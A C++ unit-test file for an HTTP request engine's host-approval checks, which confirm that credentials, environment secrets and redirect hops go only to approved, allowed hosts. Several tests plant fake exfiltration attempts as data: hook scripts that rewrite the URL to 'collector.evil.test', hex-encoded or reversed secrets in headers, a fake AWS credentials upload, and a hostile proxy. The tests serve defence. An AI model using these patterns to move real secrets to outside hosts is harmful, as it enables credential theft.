// HostApprovalTest — FR-15.9 at send time: a credential, secret or session cookie goes to a host
// only after the person approved it for this project; an actor's `allowed_hosts` (or, with none,
// the baseUrl host) limits where its credentials may go; hooks, token URLs and redirect hops are
// checked too. Nothing here approves loopback or any other host implicitly.
#include "MockSutHarness.h"
#include "support/HermeticDependencies.h"
#include "support/TempPath.h"

#include "domain/SecretRegistry.h"
#include "infrastructure/http/HttpClient.h"

#include <reqloom/engine/Factories.h>
#include <reqloom/engine/HostApproval.h>
#include <reqloom/engine/PublicApi.h>

#include <gtest/gtest.h>
#include <nlohmann/json.hpp>

#include <chrono>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <memory>
#include <mutex>
#include <string>
#include <vector>

namespace ce = reqloom::engine;
namespace ct = reqloom::tests;

namespace {

constexpr const char* kBearer = "fake-test-bearer-token-0001";

/// Records every request; answers 200 with a token body that also satisfies a token endpoint.
class RecordingHttp final : public ce::HttpClient {
public:
    std::expected<ce::HttpResponse, ce::ReqloomError> send(const ce::HttpRequest& r) override {
        const std::scoped_lock lock{mutex_};
        requests_.push_back(r);
        ce::HttpResponse resp;
        resp.status = 200;
        resp.headers = {{"Content-Type", "application/json"}};
        resp.body = R"({"access_token":"fake-access-token-0009","expires_in":3600,"id":"x1"})";
        return resp;
    }
    [[nodiscard]] std::vector<ce::HttpRequest> requests() const {
        const std::scoped_lock lock{mutex_};
        return requests_;
    }

private:
    mutable std::mutex mutex_;
    std::vector<ce::HttpRequest> requests_;
};

class ScriptedApprover final : public ce::HostApprover {
public:
    explicit ScriptedApprover(ce::HostApprovalAnswer answer) : answer_(answer) {}
    ce::HostApprovalAnswer ask(const ce::HostApprovalRequest& request) override {
        asked.push_back(request);
        return answer_;
    }
    [[nodiscard]] std::string howToApprove(const ce::HostApprovalRequest& r) const override {
        return "TEST-HINT approve " + r.host;
    }
    std::vector<ce::HostApprovalRequest> asked;

private:
    ce::HostApprovalAnswer answer_;
};

struct Rig {
    RecordingHttp* http{nullptr};
    ct::MemoryHostApprovals* approvals{nullptr};
    std::unique_ptr<ce::ExecutionEngine> engine;
};

[[nodiscard]] Rig makeRig(bool withHooks = false) {
    Rig rig;
    auto http = std::make_unique<RecordingHttp>();
    auto approvals = std::make_unique<ct::MemoryHostApprovals>(/*approveEveryHost=*/false);
    rig.http = http.get();
    rig.approvals = approvals.get();
    ce::ExecutionEngine::Dependencies deps{std::move(http),
                                           nullptr,
                                           nullptr,
                                           nullptr,
                                           withHooks ? ce::makeQuickJsHookRunner() : nullptr};
    deps.hostApprovals = std::move(approvals);
    rig.engine = std::make_unique<ce::ExecutionEngine>(std::move(deps));
    return rig;
}

[[nodiscard]] ce::Operation makeOp(const std::string& resource, const std::string& name) {
    ce::Operation op;
    op.id = ce::OperationId{resource + "." + name};
    op.resource = ce::ResourceId{resource};
    op.method = ce::HttpMethod::Get;
    op.pathTemplate = "/" + name;
    op.expectStatus = 200;
    return op;
}

/// A bearer actor `svc` with operations `me.get` (as svc), `me.second` (as svc, after get) and
/// `open.get` (no actor, no credential).
[[nodiscard]] ce::Project makeProject(const std::string& baseUrl = "https://api.example.test") {
    ce::Project p;
    p.name = "Hosts";
    p.id = "proj-hosts";
    p.defaultEnvironment = "local";
    p.environments["local"] = {{"baseUrl", baseUrl}};

    ce::Actor actor;
    actor.id = ce::ActorId{"svc"};
    actor.strategy = ce::AuthStrategy::Bearer;
    actor.authConfig["token"] = kBearer;
    p.actors[actor.id] = actor;

    ce::Resource me;
    me.id = ce::ResourceId{"me"};
    auto get = makeOp("me", "get");
    get.actor = actor.id;
    auto second = makeOp("me", "second");
    second.actor = actor.id;
    second.explicitDependencies = {get.id};
    me.operations["get"] = get;
    me.operations["second"] = second;
    p.resources[me.id] = me;

    ce::Resource open;
    open.id = ce::ResourceId{"open"};
    open.operations["get"] = makeOp("open", "get");
    p.resources[open.id] = open;
    return p;
}

[[nodiscard]] const ce::StepResult& lastStep(const ce::RunResult& r) {
    return r.steps.back();
}

[[nodiscard]] bool anyRequestContains(const RecordingHttp& http, const std::string& needle) {
    for (const auto& r : http.requests()) {
        if (r.url.find(needle) != std::string::npos ||
            (r.body && r.body->find(needle) != std::string::npos)) {
            return true;
        }
        for (const auto& [k, v] : r.headers) {
            if (v.find(needle) != std::string::npos) {
                return true;
            }
        }
    }
    return false;
}

}  // namespace

TEST(HostApproval, actor_credentials_to_an_unapproved_host_are_not_sent_without_an_approver) {
    auto rig = makeRig();
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_FALSE(result->succeeded());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("https://api.example.test:443"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty()) << "a request was sent";
}

TEST(HostApproval, approver_saying_yes_sends_and_remembers_the_host) {
    auto rig = makeRig();
    ScriptedApprover approver{ce::HostApprovalAnswer::Approve};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"me.second"}, ctx, options);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_TRUE(result->succeeded()) << lastStep(*result).detail;
    ASSERT_EQ(approver.asked.size(), 1U) << "asked more than once for one host in one run";
    EXPECT_EQ(approver.asked.front().host, "https://api.example.test:443");
    EXPECT_EQ(approver.asked.front().projectId, "proj-hosts");
    EXPECT_NE(approver.asked.front().credential.find("svc"), std::string::npos);
    EXPECT_EQ(rig.http->requests().size(), 2U);
    EXPECT_EQ(*rig.approvals->approvedHosts(makeProject()),
              (std::vector<std::string>{"https://api.example.test:443"}));

    // The next run finds the approval and does not ask.
    ScriptedApprover second{ce::HostApprovalAnswer::Deny};
    options.hostApprover = &second;
    ce::RunContext ctx2;
    auto again = rig.engine->run(makeProject(), ce::OperationId{"me.get"}, ctx2, options);
    ASSERT_TRUE(again.has_value());
    EXPECT_TRUE(again->succeeded());
    EXPECT_TRUE(second.asked.empty());
}

TEST(HostApproval, approver_saying_no_sends_nothing_and_is_asked_once) {
    auto rig = makeRig();
    ScriptedApprover approver{ce::HostApprovalAnswer::Deny};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"me.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("declined"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_EQ(approver.asked.size(), 1U);
    EXPECT_TRUE(rig.http->requests().empty());
    EXPECT_TRUE(rig.approvals->approvedHosts(makeProject())->empty());
}

TEST(HostApproval, approver_that_cannot_ask_ends_the_error_with_its_hint) {
    auto rig = makeRig();
    ScriptedApprover approver{ce::HostApprovalAnswer::Unavailable};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"me.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("TEST-HINT approve https://api.example.test:443"),
              std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, run_approval_sends_without_asking_or_storing) {
    auto rig = makeRig();
    ScriptedApprover approver{ce::HostApprovalAnswer::Deny};
    ce::RunOptions options;
    options.hostApprover = &approver;
    options.approvedHostsForRun = {"https://api.example.test:443"};
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"me.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_TRUE(result->succeeded()) << lastStep(*result).detail;
    EXPECT_TRUE(approver.asked.empty());
    EXPECT_TRUE(rig.approvals->approvedHosts(makeProject())->empty());
}

TEST(HostApproval, request_without_a_credential_needs_no_approval) {
    auto rig = makeRig();
    ScriptedApprover approver{ce::HostApprovalAnswer::Deny};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(makeProject(), ce::OperationId{"open.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_TRUE(result->succeeded()) << lastStep(*result).detail;
    EXPECT_TRUE(approver.asked.empty());
    EXPECT_EQ(rig.http->requests().size(), 1U);
}

TEST(HostApproval, loopback_is_not_approved_implicitly) {
    auto rig = makeRig();
    ce::RunContext ctx;
    auto result =
        rig.engine->run(makeProject("http://127.0.0.1:3000"), ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, session_cookie_set_by_hand_needs_approval) {
    auto rig = makeRig();
    auto project = makeProject();
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").headers["Cookie"] =
        "sid=fake-test-session-0004";
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("session cookie"), std::string::npos);
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, allowed_hosts_forbids_a_host_even_when_it_is_approved) {
    auto rig = makeRig();
    auto project = makeProject();
    project.actors.at(ce::ActorId{"svc"}).allowedHosts = {"other.example.test"};
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    ScriptedApprover approver{ce::HostApprovalAnswer::Approve};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("allowed_hosts"), std::string::npos);
    EXPECT_TRUE(approver.asked.empty()) << "asked about a host allowed_hosts forbids";
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, allowed_hosts_never_grants_a_host) {
    auto rig = makeRig();
    auto project = makeProject();
    project.actors.at(ce::ActorId{"svc"}).allowedHosts = {"api.example.test"};
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, hook_rewriting_the_url_to_another_host_is_refused) {
    auto rig = makeRig(/*withHooks=*/true);
    auto project = makeProject();
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    project.resources.at(ce::ResourceId{"me"}).operations.at("get").preRequestScript =
        "ctx.request.url = 'https://collector.evil.test/steal';";
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("collector.evil.test"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_FALSE(anyRequestContains(*rig.http, kBearer));
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, token_url_on_another_host_needs_allowed_hosts_and_approval) {
    auto rig = makeRig();
    auto project = makeProject();
    auto& actor = project.actors.at(ce::ActorId{"svc"});
    actor.strategy = ce::AuthStrategy::OAuth2ClientCredentials;
    actor.authConfig = {{"token_url", "https://idp.evil.test/token"},
                        {"client_id", "client-1"},
                        {"client_secret", "fake-test-client-secret-0005"}};
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("https://idp.evil.test:443"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty()) << "the client secret reached the token endpoint";

    // Listed and approved, the token request goes.
    actor.allowedHosts = {"api.example.test", "idp.evil.test"};
    ASSERT_TRUE(rig.approvals->approve(project, "https://idp.evil.test:443").has_value());
    ce::RunContext ctx2;
    auto ok = rig.engine->run(project, ce::OperationId{"me.get"}, ctx2);
    ASSERT_TRUE(ok.has_value());
    EXPECT_TRUE(ok->succeeded()) << lastStep(*ok).detail;
}

// Coordinator item 1: an environment secret (CLI) is guarded by host approval alone, since the
// keychain's folder check is skipped for it.
TEST(HostApproval, environment_secret_to_an_unapproved_host_is_never_sent) {
#if defined(_WIN32)
    _putenv_s("REQLOOM_SECRET_HOSTTEST_KEY", "fake-test-env-secret-0006");
#else
    setenv("REQLOOM_SECRET_HOSTTEST_KEY", "fake-test-env-secret-0006", 1);
#endif
    auto rig = makeRig();
    auto project = makeProject("https://collector.evil.test");
    project.id.clear();  // a hostile project needs no id for an environment secret
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").headers["X-Custom"] =
        "{{secret.hosttest_key}}";
    ce::RunOptions options;
    options.secretsFromEnvironment = true;
    options.agentOutput = true;
    ce::RunContext ctx;
    std::vector<std::string> eventText;
    rig.engine->subscribe([&](const ce::RunEvent& ev) {
        if (const auto* failed = std::get_if<ce::StepFailed>(&ev)) {
            eventText.push_back(failed->detail);
        }
    });
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx, options);
#if defined(_WIN32)
    _putenv_s("REQLOOM_SECRET_HOSTTEST_KEY", "");
#else
    unsetenv("REQLOOM_SECRET_HOSTTEST_KEY");
#endif
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_TRUE(rig.http->requests().empty()) << "the environment secret was sent";
    EXPECT_EQ(lastStep(*result).detail.find("fake-test-env-secret-0006"), std::string::npos);
    for (const auto& text : eventText) {
        EXPECT_EQ(text.find("fake-test-env-secret-0006"), std::string::npos) << text;
    }
}

TEST(HostApproval, secret_in_an_ordinary_header_needs_approval) {
    auto rig = makeRig();
    auto project = makeProject();
    project.defaultAuth.reset();
    auto& op = project.resources.at(ce::ResourceId{"open"}).operations.at("get");
    op.headers["X-Custom"] = std::string{"tok "} + kBearer;  // not a credential-looking name
    // The bearer value is registered because actor svc's config holds it.
    ScriptedApprover approver{ce::HostApprovalAnswer::Deny};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    ctx.secretRegistry().add(kBearer);
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx, options);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    ASSERT_EQ(approver.asked.size(), 1U);
    EXPECT_NE(approver.asked.front().credential.find("X-Custom"), std::string::npos);
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, a_project_proxy_needs_approval_even_for_https) {
    auto rig = makeRig();
    auto project = makeProject();
    ce::TransportConfig transport;
    transport.proxy = "http://proxy.evil.test:8080";
    project.transport["local"] = transport;
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("proxy.evil.test:8080"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, literal_key_in_the_query_string_needs_approval) {
    auto rig = makeRig();
    auto project = makeProject();
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").pathTemplate =
        "/get?key=fake-literal-key-0010";
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_TRUE(rig.http->requests().empty());
}

// ─── Review findings (2026-11-17): credentials judged by what the operation refers to ─────

namespace {

class ScopedSecretEnv {
public:
    ScopedSecretEnv(const char* name, const char* value) : name_(name) {
#if defined(_WIN32)
        _putenv_s(name_, value);
#else
        setenv(name_, value, 1);
#endif
    }
    ~ScopedSecretEnv() {
#if defined(_WIN32)
        _putenv_s(name_, "");
#else
        unsetenv(name_);
#endif
    }
    ScopedSecretEnv(const ScopedSecretEnv&) = delete;
    ScopedSecretEnv& operator=(const ScopedSecretEnv&) = delete;
    ScopedSecretEnv(ScopedSecretEnv&&) = delete;
    ScopedSecretEnv& operator=(ScopedSecretEnv&&) = delete;

private:
    const char* name_;
};

[[nodiscard]] ce::RunOptions envSecrets() {
    ce::RunOptions options;
    options.secretsFromEnvironment = true;
    return options;
}

}  // namespace

TEST(HostApproval, hex_encoded_secret_on_an_actorless_operation_needs_approval) {
    const ScopedSecretEnv secret{"REQLOOM_SECRET_PROD_API_KEY", "fake-prod-api-key-0011"};
    auto rig = makeRig();
    auto project = makeProject("https://collector.evil.test");
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").headers["X-Trace-Id"] =
        "{{$.hex.encode(secret.prod_api_key)}}";
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx, envSecrets());
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty()) << "a hex-encoded secret was sent";
}

TEST(HostApproval, actorless_operation_using_an_actors_value_obeys_that_actors_limits) {
    auto rig = makeRig();
    auto project = makeProject("https://collector.evil.test");
    project.actors.at(ce::ActorId{"svc"}).allowedHosts = {"api.example.test"};
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").headers["X-T"] =
        "{{$.hex.encode(svc.access_token)}}";
    // The evil host is even approved: svc's allowed_hosts must still forbid it.
    ASSERT_TRUE(rig.approvals->approve(project, "https://collector.evil.test:443").has_value());
    ce::RunContext ctx;
    ce::ActorSession session;
    session.state = ce::ActorSession::State::Live;
    session.expiresAt = std::chrono::steady_clock::now() + std::chrono::hours{1};
    session.variables["access_token"] = "fake-session-token-0012";
    ctx.putSession(ce::ActorId{"svc"}, session);
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_NE(lastStep(*result).detail.find("allowed_hosts"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, hook_given_a_secret_forces_approval_of_the_host_it_sends_to) {
    const ScopedSecretEnv secret{"REQLOOM_SECRET_K", "fake-hook-secret-0013"};
    auto rig = makeRig(/*withHooks=*/true);
    auto project = makeProject();
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    project.resources.at(ce::ResourceId{"open"}).operations.at("get").preRequestScript =
        "ctx.request.headers['X-R'] = ctx.secret.k.split('').reverse().join('');"
        "ctx.request.url = 'https://collector.evil.test/r';";
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx, envSecrets());
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty()) << "the reversed secret was sent";
}

TEST(HostApproval, uploaded_local_file_needs_approval_and_is_named) {
    const auto file = ct::uniqueTempPath("reqloom-upload", ".txt");
    {
        std::ofstream out{file};
        out << "[default]\naws_secret_access_key = fake\n";
    }
    auto rig = makeRig();
    auto project = makeProject("https://collector.evil.test");
    auto& op = project.resources.at(ce::ResourceId{"open"}).operations.at("get");
    op.method = ce::HttpMethod::Post;
    op.bodyForm = std::map<std::string, std::string>{{"f", "@" + file.string()}};
    ScriptedApprover approver{ce::HostApprovalAnswer::Deny};
    ce::RunOptions options;
    options.hostApprover = &approver;
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"open.get"}, ctx, options);
    std::filesystem::remove(file);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    ASSERT_EQ(approver.asked.size(), 1U);
    EXPECT_NE(approver.asked.front().credential.find("local file"), std::string::npos)
        << approver.asked.front().credential;
    EXPECT_NE(approver.asked.front().credential.find(file.filename().string()), std::string::npos)
        << approver.asked.front().credential;
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, approval_of_https_does_not_cover_plain_http_on_the_same_port) {
    auto rig = makeRig();
    auto project = makeProject("http://api.example.test:443");
    ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
    ce::RunContext ctx;
    auto result = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved);
    EXPECT_NE(lastStep(*result).detail.find("http://api.example.test:443"), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_TRUE(rig.http->requests().empty());
}

TEST(HostApproval, tls_verification_off_or_a_custom_ca_asks_again) {
    for (const bool customCa : {false, true}) {
        auto rig = makeRig();
        auto project = makeProject();
        ASSERT_TRUE(rig.approvals->approve(project, "https://api.example.test:443").has_value());
        ce::TransportConfig transport;
        if (customCa) {
            transport.caBundlePath = "/tmp/project-ca.pem";
        } else {
            transport.tlsVerify = false;
        }
        project.transport["local"] = transport;
        ce::RunContext ctx;
        auto refused = rig.engine->run(project, ce::OperationId{"me.get"}, ctx);
        ASSERT_TRUE(refused.has_value());
        EXPECT_EQ(lastStep(*refused).error, ce::ErrorCode::HostNotApproved) << customCa;
        EXPECT_NE(lastStep(*refused).detail.find(customCa ? "certificate authority" : "TLS"),
                  std::string::npos)
            << lastStep(*refused).detail;
        EXPECT_TRUE(rig.http->requests().empty());

        ScriptedApprover approver{ce::HostApprovalAnswer::Approve};
        ce::RunOptions options;
        options.hostApprover = &approver;
        ce::RunContext ctx2;
        auto asked = rig.engine->run(project, ce::OperationId{"me.get"}, ctx2, options);
        ASSERT_TRUE(asked.has_value());
        EXPECT_TRUE(asked->succeeded()) << lastStep(*asked).detail;
        ASSERT_EQ(approver.asked.size(), 1U) << customCa;
    }
}

// ─── Redirect hops, against two real servers ─────────────────────────────────

namespace {

[[nodiscard]] std::filesystem::path writeRoutes(const nlohmann::json& routes) {
    const auto path = ct::uniqueTempPath("reqloom-host-routes", ".json");
    std::ofstream out{path};
    out << nlohmann::json{{"routes", routes}}.dump();
    return path;
}

class HostApprovalRedirect : public ::testing::Test {
protected:
    void SetUp() override {
        targetRoutes_ = writeRoutes(nlohmann::json::array(
            {{{"method", "GET"}, {"path", "/landing"}, {"status", 200}, {"body", "{}"}},
             {{"method", "POST"}, {"path", "/landing"}, {"status", 200}, {"body", "{}"}}}));
        target_ = std::make_unique<ct::MockSutHarness>(targetRoutes_);
        const auto landing = target_->baseUrl() + "/landing";
        originRoutes_ =
            writeRoutes(nlohmann::json::array({{{"method", "GET"},
                                                {"path", "/go"},
                                                {"status", 302},
                                                {"headers", {{"Location", landing}}}},
                                               {{"method", "GET"},
                                                {"path", "/go307"},
                                                {"status", 307},
                                                {"headers", {{"Location", landing}}}},
                                               {{"method", "POST"},
                                                {"path", "/go307"},
                                                {"status", 307},
                                                {"headers", {{"Location", landing}}}}}));
        origin_ = std::make_unique<ct::MockSutHarness>(originRoutes_);
    }
    void TearDown() override {
        origin_.reset();
        target_.reset();
        std::filesystem::remove(targetRoutes_);
        std::filesystem::remove(originRoutes_);
    }

    /// Actor `svc` with an api_key in a custom header, which libcurl would forward on a redirect.
    [[nodiscard]] ce::Project project() const {
        auto p = makeProject(origin_->baseUrl());
        auto& actor = p.actors.at(ce::ActorId{"svc"});
        actor.strategy = ce::AuthStrategy::ApiKey;
        actor.authConfig = {
            {"key", "fake-test-api-key-0007"}, {"location", "header"}, {"name", "X-Api-Key"}};
        auto& op = p.resources.at(ce::ResourceId{"me"}).operations.at("get");
        op.pathTemplate = "/go";
        return p;
    }

    [[nodiscard]] nlohmann::json landingSeen() const {
        auto client = ce::makeCurlHttpClient();
        ce::HttpRequest probe;
        probe.url = target_->baseUrl() + "/__mock/last-request?path=/landing";
        auto res = client->send(probe);
        return res ? nlohmann::json::parse(res->body, nullptr, false) : nlohmann::json{};
    }

    [[nodiscard]] std::string hostOf(const ct::MockSutHarness& h) const {
        return *ce::hostKeyForUrl(h.baseUrl());
    }

    std::filesystem::path targetRoutes_;
    std::filesystem::path originRoutes_;
    std::unique_ptr<ct::MockSutHarness> target_;
    std::unique_ptr<ct::MockSutHarness> origin_;
};

[[nodiscard]] std::unique_ptr<ce::ExecutionEngine> curlEngine(ct::MemoryHostApprovals*& out) {
    auto deps = ce::makeDefaultDependencies();
    auto approvals = std::make_unique<ct::MemoryHostApprovals>(false);
    out = approvals.get();
    deps.hostApprovals = std::move(approvals);
    return std::make_unique<ce::ExecutionEngine>(std::move(deps));
}

}  // namespace

TEST_F(HostApprovalRedirect, credential_header_does_not_follow_a_redirect_to_an_unapproved_host) {
    ct::MemoryHostApprovals* approvals = nullptr;
    auto engine = curlEngine(approvals);
    const auto p = project();
    ASSERT_TRUE(approvals->approve(p, hostOf(*origin_)).has_value());
    ce::RunContext ctx;
    auto result = engine->run(p, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_NE(lastStep(*result).detail.find(hostOf(*target_)), std::string::npos)
        << lastStep(*result).detail;
    EXPECT_FALSE(landingSeen().value("found", true)) << "the redirect hop reached the next host";
}

TEST_F(HostApprovalRedirect, approved_and_allowed_redirect_target_receives_the_credential) {
    ct::MemoryHostApprovals* approvals = nullptr;
    auto engine = curlEngine(approvals);
    auto p = project();
    p.actors.at(ce::ActorId{"svc"}).allowedHosts = {"127.0.0.1:" + std::to_string(origin_->port()),
                                                    "127.0.0.1:" + std::to_string(target_->port())};
    ASSERT_TRUE(approvals->approve(p, hostOf(*origin_)).has_value());
    ASSERT_TRUE(approvals->approve(p, hostOf(*target_)).has_value());
    ce::RunContext ctx;
    auto result = engine->run(p, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_TRUE(result->succeeded()) << lastStep(*result).detail;
    EXPECT_EQ(landingSeen()["headers"].value("x-api-key", ""), "fake-test-api-key-0007");
}

// Security check finding (2026-11-17): a hop keeps the credential status of the request it
// continues while it still carries anything the project supplied, so a transformed secret cannot
// ride an open redirect on an approved host to an unapproved one.
TEST_F(HostApprovalRedirect, transformed_secret_in_a_header_does_not_follow_a_redirect) {
    const ScopedSecretEnv secret{"REQLOOM_SECRET_HOPKEY", "fake-hop-secret-0014"};
    ct::MemoryHostApprovals* approvals = nullptr;
    auto engine = curlEngine(approvals);
    auto p = makeProject(origin_->baseUrl());
    auto& op = p.resources.at(ce::ResourceId{"open"}).operations.at("get");
    op.pathTemplate = "/go307";
    op.headers["X-Trace-Id"] = "{{$.hex.encode(secret.hopkey)}}";
    ASSERT_TRUE(approvals->approve(p, hostOf(*origin_)).has_value());
    ce::RunContext ctx;
    auto result = engine->run(p, ce::OperationId{"open.get"}, ctx, envSecrets());
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_FALSE(landingSeen().value("found", true)) << "the hop reached the unapproved host";
}

TEST_F(HostApprovalRedirect, transformed_secret_in_a_body_does_not_follow_a_307) {
    const ScopedSecretEnv secret{"REQLOOM_SECRET_HOPKEY", "fake-hop-secret-0015"};
    ct::MemoryHostApprovals* approvals = nullptr;
    auto engine = curlEngine(approvals);
    auto p = makeProject(origin_->baseUrl());
    auto& op = p.resources.at(ce::ResourceId{"open"}).operations.at("get");
    op.method = ce::HttpMethod::Post;
    op.pathTemplate = "/go307";
    op.bodyTemplate = R"({"t":"{{$.hex.encode(secret.hopkey)}}"})";
    ASSERT_TRUE(approvals->approve(p, hostOf(*origin_)).has_value());
    ce::RunContext ctx;
    auto result = engine->run(p, ce::OperationId{"open.get"}, ctx, envSecrets());
    ASSERT_TRUE(result.has_value()) << result.error().detail;
    EXPECT_EQ(lastStep(*result).error, ce::ErrorCode::HostNotApproved) << lastStep(*result).detail;
    EXPECT_FALSE(landingSeen().value("found", true)) << "the hop reached the unapproved host";
}

TEST_F(HostApprovalRedirect, plain_download_redirect_still_works) {
    ct::MemoryHostApprovals* approvals = nullptr;
    auto engine = curlEngine(approvals);
    auto p = makeProject(origin_->baseUrl());  // bearer actor: only Authorization, stripped
    p.resources.at(ce::ResourceId{"me"}).operations.at("get").pathTemplate = "/go";
    ASSERT_TRUE(approvals->approve(p, hostOf(*origin_)).has_value());
    ce::RunContext ctx;
    auto result = engine->run(p, ce::OperationId{"me.get"}, ctx);
    ASSERT_TRUE(result.has_value()) << result.error().detail;
